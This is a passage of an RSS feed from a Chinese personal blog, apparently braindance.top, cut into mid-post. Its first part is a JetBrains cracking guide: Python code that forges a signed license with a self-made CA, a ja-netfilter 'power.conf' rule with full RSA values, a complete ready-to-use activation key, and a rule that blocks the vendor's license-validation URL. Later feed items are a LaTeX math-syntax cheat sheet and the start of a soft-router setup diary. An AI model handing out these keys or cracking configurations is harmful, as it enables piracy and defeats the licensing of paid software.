&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;digest &lt;span style="color:#f92672"&gt;=&lt;/span&gt; SHA1&lt;span style="color:#f92672"&gt;.&lt;/span&gt;new(licensePart&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode(&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#39;ca.key&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; prifile:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; private_key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; RSA&lt;span style="color:#f92672"&gt;.&lt;/span&gt;import_key(prifile&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# 使用私钥对HASH值进行签名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; signature &lt;span style="color:#f92672"&gt;=&lt;/span&gt; pkcs1_15&lt;span style="color:#f92672"&gt;.&lt;/span&gt;new(private_key)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sign(digest)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sig_results &lt;span style="color:#f92672"&gt;=&lt;/span&gt; base64&lt;span style="color:#f92672"&gt;.&lt;/span&gt;b64encode(signature)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; licensePartBase64 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; base64&lt;span style="color:#f92672"&gt;.&lt;/span&gt;b64encode(bytes(licensePart&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode(&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; public_key&lt;span style="color:#f92672"&gt;.&lt;/span&gt;verify(
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; base64&lt;span style="color:#f92672"&gt;.&lt;/span&gt;b64decode(sig_results),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; base64&lt;span style="color:#f92672"&gt;.&lt;/span&gt;b64decode(licensePartBase64),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; padding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;padding&lt;span style="color:#f92672"&gt;.&lt;/span&gt;PKCS1v15(),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; algorithm&lt;span style="color:#f92672"&gt;=&lt;/span&gt;hashes&lt;span style="color:#f92672"&gt;.&lt;/span&gt;SHA1(),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;=&lt;/span&gt; licenseId &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; licensePartBase64&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decode(&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; sig_results&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decode(&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; certBase64
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(result)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装 Crypto 依赖使用 &lt;code&gt;pip install pycrytodome&lt;/code&gt;。&lt;strong&gt;需要修改变量&lt;/strong&gt; &lt;code&gt;certBase64 &lt;/code&gt; &lt;strong&gt;为第一个文件生成的 cert 证书内容（自行删除换行）&lt;/strong&gt;。其中变量 &lt;code&gt;licensePart&lt;/code&gt; 中的信息和变量 &lt;code&gt;licenseId&lt;/code&gt; 对应，&lt;code&gt;licenseeName&lt;/code&gt; 可以自行修改，&lt;code&gt;code&lt;/code&gt; 应该就是全家桶各个软件的缩写，&lt;code&gt;paidUpTo&lt;/code&gt; 过期时间。&lt;/p&gt;
&lt;p&gt;配置文件&lt;code&gt;congig/power.conf&lt;/code&gt; 的格式&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;[Result]
EQUAL,sign,y,z-&amp;gt;result
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;sign&lt;/code&gt; 和 &lt;code&gt;result&lt;/code&gt; 分别对应第二个文件的两行输出，分别是签名密文、证书签名。&lt;code&gt;y&lt;/code&gt;,&lt;code&gt;z&lt;/code&gt; 分别是 RSA 中的指数、jetbrains内置root证书的公钥（&lt;strong&gt;不用修改&lt;/strong&gt;）。最终配置文件。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;[Result]
EQUAL,688827393930711928512275549698293070665686146516966052655941231404870441973710402205123355604429394140415171936010826276494797379204430556181912308828215621834023869095264591943036963130120724420798769592253168800129581361086511367675773802899334078239434964778238252446370058840916752890687348786357248109407287360623267817632253915161513374442235501450990684679388233149022805420822037547053343732736438118829252210572948271275369220730128852181626787073863828515056541044882335869396696141056207575568411139674823212977124270019967190277434142980781559286683916236429191621661925978231096547985871015033045347745040517507548703203423373963474065307957598679613534182723075187728429764246533540129748262856350129370323776549193166705032852633517719905394268849453593835332705268187404502153581134679736820933961668519544538659820375073084965933956885058156852851457008982063229683626311524790625910341414580691932545385821852904086377007435193707757250435137675275183055336401236456974574121655434382553698002922301524374402422775517514284490136029700408044713357398902530280387081498510385206614656124276242043287045844898682620475564484729941780647067683830306648941012819834344380065067184504095694554818053932782057955011188082,65537,860106576952879101192782278876319243486072481962999610484027161162448933268423045647258145695082284265933019120714643752088997312766689988016808929265129401027490891810902278465065056686129972085119605237470899952751915070244375173428976413406363879128531449407795115913715863867259163957682164040613505040314747660800424242248055421184038777878268502955477482203711835548014501087778959157112423823275878824729132393281517778742463067583320091009916141454657614089600126948087954465055321987012989937065785013284988096504657892738536613208311013047138019418152103262155848541574327484510025594166239784429845180875774012229784878903603491426732347994359380330103328705981064044872334790365894924494923595382470094461546336020961505275530597716457288511366082299255537762891238136381924520749228412559219346777184174219999640906007205260040707839706131662149325151230558316068068139406816080119906833578907759960298749494098180107991752250725928647349597506532778539709852254478061194098069801549845163358315116260915270480057699929968468068015735162890213859113563672040630687357054902747438421559817252127187138838514773245413540030800888215961904267348727206110582505606182944023582459006406137831940959195566364811905585377246353-&amp;gt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;激活key&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;R7FP0YWA38-eyJsaWNlbnNlSWQiOiJSN0ZQMFlXQTM4IiwibGljZW5zZWVOYW1lIjoiQnJhaW5kYW5jZSIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IkRQTiIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiREIiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJJSSIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlNDIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkdPIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlNGIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkRTIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQQyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkMiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkNMIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJXUyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkQiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTMCIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUk0iLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkFDIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJSU1YiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTVSIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiRFAiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUERCIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU0kiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBHTyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJwYWlkVXBUbyI6IjIwNzctMDEtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFJCIiwicGFpZFVwVG8iOiIyMDc3LTAxLTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTVyIsInBhaWRVcFRvIjoiMjA3Ny0wMS0wMSIsImV4dGVuZGVk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
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;应该可以直接使用我上面的配置，自己生成也可以。重启软件激活&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/10/07/6520eff16b4a4.png"
loading="lazy"
alt="1696657436047.png"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2024年10月21日&lt;/strong&gt;发现了个新问题。参照[博客][https://www.cnblogs.com/airlongdianblog/p/18418285]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2024.2后jetbrains新的安装程序自带了三个区域语言包，其中若选择中文大陆区域语言包，会将激活验证服务器地址修改为国内新验证地址。而jetbra/ja-netfaliter的拦截是黑名单制度，该新服务器地址并不在原本的拦截列表中。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这时激活失效并且会不断弹窗，只需要在&lt;code&gt;config/url.conf&lt;/code&gt;中加入拦截域名，重新启动即可。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;PREFIX,https://account.jetbrains.com.cn/lservice/rpc/validateKey.action
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上面文章内容已经添加了。&lt;/p&gt;</description></item><item><title>LaTex数学公式</title><link>https://www.braindance.top/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</link><pubDate>Sun, 21 May 2023 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</guid><description>&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/m0_55746113/article/details/122728673" target="_blank" rel="noopener"
&gt;https://blog.csdn.net/m0_55746113/article/details/122728673&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="标注符号"&gt;标注符号
&lt;/h2&gt;&lt;h3 id="上下标"&gt;上下标
&lt;/h3&gt;&lt;p&gt;上标符号为“^”、下标符号为“_” ，多于一个字符用&lt;code&gt;{}&lt;/code&gt;包含，例如&lt;code&gt;2^r&lt;/code&gt;、&lt;code&gt;a_5&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$2^r,a_5,A_{n+1}$&lt;/p&gt;
&lt;h3 id="平均值箭头向量等"&gt;平均值、箭头、向量等
&lt;/h3&gt;&lt;p&gt;加^号：&lt;code&gt;\hat{x}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;加横线：&lt;code&gt;\overline{x}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;加^：&lt;code&gt;\widehat{x}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;加波浪线：&lt;code&gt;\widetilde{x}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;加一个点：&lt;code&gt;\dot{x}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;加两个点：&lt;code&gt;\ddot{x}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$\hat x,\overline x,\widehat x,\widetilde x,\dot x,\ddot x$&lt;/p&gt;
&lt;h3 id="加粗"&gt;加粗
&lt;/h3&gt;&lt;p&gt;矩阵字母一般会用加粗的罗马体来表示。&lt;code&gt;\bf&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="根号"&gt;根号
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;\sqrt{}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="希腊字母表"&gt;希腊字母表
&lt;/h2&gt;&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/10/12/6527dfcd9db91.png"
loading="lazy"
alt="1697112011353.png"
&gt;&lt;/p&gt;
&lt;h2 id="运算符号"&gt;运算符号
&lt;/h2&gt;&lt;h3 id="加减乘除"&gt;加减乘除
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;+&lt;/code&gt; 和 &lt;code&gt;-&lt;/code&gt;。&lt;code&gt;\times&lt;/code&gt; 和 &lt;code&gt;\div&lt;/code&gt;。点乘用 &lt;code&gt;\cdot&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$ +,-,\times,\div,\cdot$&lt;/p&gt;
&lt;h3 id="大于小于约等于"&gt;大于、小于、约等于
&lt;/h3&gt;&lt;p&gt;大于小于直接 &lt;code&gt;&amp;gt;&lt;/code&gt; 、 &lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;大于等于 &lt;code&gt;\ge&lt;/code&gt;，小于等于 &lt;code&gt;\le&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;远大于 &lt;code&gt;\gg&lt;/code&gt;，远小于 &lt;code&gt;\ll&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不等于 &lt;code&gt;\ne&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;约等于 &lt;code&gt;\approx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$&amp;gt;,&amp;lt;,\ge,\le,\gg,\ll,\ne,\approx$&lt;/p&gt;
&lt;h3 id="分式和根式"&gt;分式和根式
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;\frac{分子}{分母}&lt;/code&gt;或&lt;code&gt;\frac 分子 分母&lt;/code&gt;。如&lt;/p&gt;
&lt;p&gt;$ \frac{1}{2}$&lt;/p&gt;
&lt;h3 id="交集并集"&gt;交集并集
&lt;/h3&gt;&lt;p&gt;交集用 &lt;code&gt;\cap&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;并集用 &lt;code&gt;\cup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$\cap,\cup$&lt;/p&gt;
&lt;h3 id="属于不属于"&gt;属于不属于
&lt;/h3&gt;&lt;p&gt;属于用 &lt;code&gt;\in&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不属于用 &lt;code&gt;\notin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$\in,\notin$&lt;/p&gt;
&lt;h3 id="省略号"&gt;省略号
&lt;/h3&gt;&lt;p&gt;横向省略号 &lt;code&gt;\cdots&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;垂直省略号 &lt;code&gt;\vdots&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;斜向省略号 &lt;code&gt;\ddots&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$\cdots, \vdots , \ddots $&lt;/p&gt;
&lt;h3 id="求和与求积"&gt;求和与求积
&lt;/h3&gt;&lt;p&gt;求和用 &lt;code&gt;\sum&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;求积（product）用 &lt;code&gt;\prod&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以用&lt;code&gt;\limits&lt;/code&gt;来强制显示在下方。&lt;/p&gt;
&lt;p&gt;$\sum,\prod,\sum_i,\sum \limits_{i=1}^N,\prod_{i=1}^N x_i$&lt;/p&gt;
&lt;h2 id="标注符号-1"&gt;标注符号
&lt;/h2&gt;&lt;h3 id="括号"&gt;括号
&lt;/h3&gt;&lt;p&gt;小括号直接 &lt;code&gt;()&lt;/code&gt;，中括号直接 &lt;code&gt;[]&lt;/code&gt;，大括号 &lt;code&gt;\{\}&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;左向上取整 &lt;code&gt;\lceil&lt;/code&gt;，右向上取整 &lt;code&gt;\rceil&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$\lceil ,\rceil $&lt;/p&gt;
&lt;p&gt;左向下取整 &lt;code&gt;\lfloor&lt;/code&gt;，右向下取整 &lt;code&gt;\rfloor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$\lfloor ,\rfloor $&lt;/p&gt;
&lt;p&gt;绝对值用&lt;code&gt;||&lt;/code&gt;&lt;/p&gt;
&lt;h4 id="下方加符号"&gt;下方加符号
&lt;/h4&gt;&lt;p&gt;在任意符号下面加符号 &lt;code&gt;\underset{}{}&lt;/code&gt;。例如 &lt;code&gt;\underset{B}{A}&lt;/code&gt;。在下方换行使用 &lt;code&gt;\substack{}&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;$\underset{B}{A}，\underset{\substack{B&amp;gt;0 \ C&amp;lt;0}}{A}$&lt;/p&gt;
&lt;h3 id="花体符号"&gt;花体符号
&lt;/h3&gt;&lt;p&gt;傅里叶变换中的f用 &lt;code&gt;\mathcal&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;$\mathcal f,\mathcal L,\mathcal G$&lt;/p&gt;
&lt;h2 id="多行公式"&gt;多行公式
&lt;/h2&gt;&lt;p&gt;使用 &lt;code&gt;\\&lt;/code&gt; 来换行，使用 &lt;code&gt;\begin{align}&lt;/code&gt;、&lt;code&gt;\end{align}&lt;/code&gt; 环绕表示多行环境。多行环境&lt;code&gt;\\&lt;/code&gt;默认右对齐，如果想要使&lt;strong&gt;某个符号对齐&lt;/strong&gt;，需要在符号前加 &lt;code&gt;&amp;amp;&lt;/code&gt;，例如&lt;code&gt;=&lt;/code&gt;号前面&lt;/p&gt;
&lt;p&gt;$ \begin{align} a&amp;amp;=b+c+d \ &amp;amp;=e+f \end{align}$
$$
\begin{align}
a&amp;amp;=b+c+d \
&amp;amp;=e+f
\end{align}
$$&lt;/p&gt;</description></item><item><title>软路由日记(一)</title><link>https://www.braindance.top/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/</link><pubDate>Fri, 03 Feb 2023 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;在学校疫情期间买了一个 j4125 的软路由，一直等到回家过了很久才到手，因为买的是裸机，还有些配件是在别的店买的，回家以后发现地址只能在区以内修改，只能取消订单重新下了单。&lt;/p&gt;
&lt;p&gt;最后的配件列表如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DDR4 8G * 2&lt;/li&gt;
&lt;li&gt;128G msata * 1&lt;/li&gt;
&lt;li&gt;金士顿 480G sata * 1 （送的有sata的电源线和数据线，要注意下电源线用那种带拐角的，不然不好插上去）&lt;/li&gt;
&lt;li&gt;DV 12V5A 电源 5.5mm&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原来咸鱼上买了假三星内存条回来插上发现不能用，所以把笔记本上的两根 8G 换下来了，然后又觉得电脑单根有点卡，所以又下了一单，哈哈哈现在电脑上是假三星 32G。电源是发货最慢的，我把家里路由器机顶盒的电源找了个遍，发现都插不上去，重要的是同样是圆口的插孔，还分好多不一样的尺寸，这个是最大的 5.5mm 的，最后出去找了一家买监控的店，在压箱货里面找到了一个非常非常塑料感的电源，卖了我 30 块，我现在还记得我进去的时候老板正在玩魔兽骑着坐骑跑路。&lt;/p&gt;
&lt;p&gt;再安利两个视频，我前期了解主要通过这两个 up 的视频学习的。&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.bilibili.com/video/BV1WL411P7yN" target="_blank" rel="noopener"
&gt;保姆级J4125英特尔2.5G安装PVE+Ikuai+Openwrt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.bilibili.com/video/BV13b4y1J7dX" target="_blank" rel="noopener"
&gt;用U盘直接给J4125软路由安装OpenWrt固件，超简单小白也看得懂&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="准备材料"&gt;准备材料
&lt;/h2&gt;&lt;p&gt;需要准备：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;U盘一个。制作引导盘，安装完成以后可以恢复&lt;/li&gt;
&lt;li&gt;键盘。安装向导需要一些配置&lt;/li&gt;
&lt;li&gt;网线。安装完成以后可以访问 web页面配置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;软件安装包：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Restful。官网：&lt;a class="link" href="http://rufus.ie/zh/" target="_blank" rel="noopener"
&gt;http://rufus.ie/zh/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;pve镜像。官网：&lt;a class="link" href="https://www.proxmox.com/en/downloads" target="_blank" rel="noopener"
&gt;https://www.proxmox.com/en/downloads&lt;/a&gt;。要下载名称有 ISO Installer 才是系统镜像文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="restful-制作安装"&gt;Restful 制作安装
